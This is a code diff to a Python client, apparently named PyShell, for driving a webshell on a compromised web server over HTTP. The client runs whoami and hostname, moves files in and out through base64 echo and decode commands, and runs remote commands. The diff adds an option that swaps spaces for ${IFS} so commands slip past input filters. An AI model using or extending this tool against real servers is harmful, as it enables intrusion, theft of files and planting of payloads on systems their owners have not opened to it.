@@ -57,6 +57,7 @@ try:
    PARAM = args.param
    PIPE = ""
    COMMAND_LIST = ["ls", "dir", "cat", "type", "rm", "del", "file"]
+   space = " "
    if args.pipe:
       PIPE = "|"
    whoami = send_command(PIPE + "whoami", WEBSHELL, HTTP_METHOD, PARAM)
@@ -89,12 +90,12 @@ try:
    while True:
       try:
          cinput = (colored(" [PyShell] ", "grey", "on_green")) ; cinput += (colored(" ", "green", "on_blue"))
-         cinput += (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip()+" ", "grey", "on_blue"))
+         cinput += (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip() + " ", "grey", "on_blue"))
          if len(str(path).rstrip()) > 30:
             shortpath = str(path).rstrip().split(slash)[-3:] ; shortpath = ".." + slash + slash.join(map(str, shortpath))
-            cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(shortpath.rstrip()+" ", "grey", "on_yellow"))
+            cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(shortpath.rstrip() + " ", "grey", "on_yellow"))
          else:
-            cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(path.rstrip()+" ", "grey", "on_yellow"))
+            cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(path.rstrip() + " ", "grey", "on_yellow"))
          cinput += (colored(" ", "yellow"))
          command = input(cinput + "\001\033[0m\002")
          if command == "exit":
@@ -103,6 +104,7 @@ try:
          else:
             if args.ifs:
                command = command.replace(" ","${IFS}")
+               space = "${IFS}"
             if len(command) == 0:
                print("\n")
                continue
@@ -131,10 +133,10 @@ try:
                   except OSError:
                      print (colored("[!] Local file " + localfile + " does not exist!\n", "red"))
                      continue
-                  print (colored("[+] Uploading file "+ cwd + slash + localfile +" on "+ remotefile +"..\n", "yellow"))
+                  print (colored("[+] Uploading file "+ cwd + slash + localfile +" on "+ remotefile +"..\n", "red"))
                   upload = send_command(PIPE + "echo " + str(base64data.rstrip(), "utf8") + " > " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                   if system == "linux":
-                     send_command(PIPE + "base64 -di " + remotefile + " > " + remotefiletmp + " ; mv " + remotefiletmp + " " +
+                     send_command(PIPE + "base64 -di " + remotefile + " > " + remotefiletmp + " ; mv " + remotefiletmp + space +
                      remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                   if system == "windows":
                      command = " ; [System.Convert]::FromBase64String($base64) | Set-Content -Encoding Byte "
@@ -152,9 +154,9 @@ try:
                         cwd = os.getcwd()
                         if localfile == ".":
                            localfile = command.split()[1]
-                        print (colored("[+] Downloading file "+ remotefile +" on "+ cwd + slash + localfile +"..\n", "yellow"))
+                        print (colored("[+] Downloading file "+ remotefile +" on "+ cwd + slash + localfile +"..\n", "red"))
                      if slash in localfile:
-                        print (colored("[+] Downloading file "+ remotefile +" on "+ localfile +"..\n", "yellow"))
+                        print (colored("[+] Downloading file "+ remotefile +" on "+ localfile +"..\n", "red"))
                      if system == "linux":
                         base64data = send_command(PIPE + "base64 " + remotefile, WEBSHELL, HTTP_METHOD, PARAM) 
                      if system == "windows":
@@ -171,6 +173,8 @@ try:
                      print (colored(path, "yellow"))
                   else:
                      if "cd" in command.split()[0]:
+                        if args.ifs:
+                           command = command.replace("${IFS}"," ")
                         if command.split()[1] == ".":
                            continue
                         if ".." in command.split()[1]:
@@ -192,7 +196,7 @@ try:
                            param = ""
                            for i in list(command_array):
                               if i.startswith("-"):
-                                 param += i + " "
+                                 param += i + space
                                  command_array.remove(i)
                            cmd = command_array.pop(0)
                            if len(command_array) == 0:
@@ -200,7 +204,7 @@ try:
                            else:
                               relative_path = command_array[0]
                            if not slash in relative_path:
-                              command = cmd + " " + param + path.rstrip() + slash + relative_path
+                              command = cmd + space + param + path.rstrip() + slash + relative_path
                            content = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
                            if "<pre>" in content:
                               content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
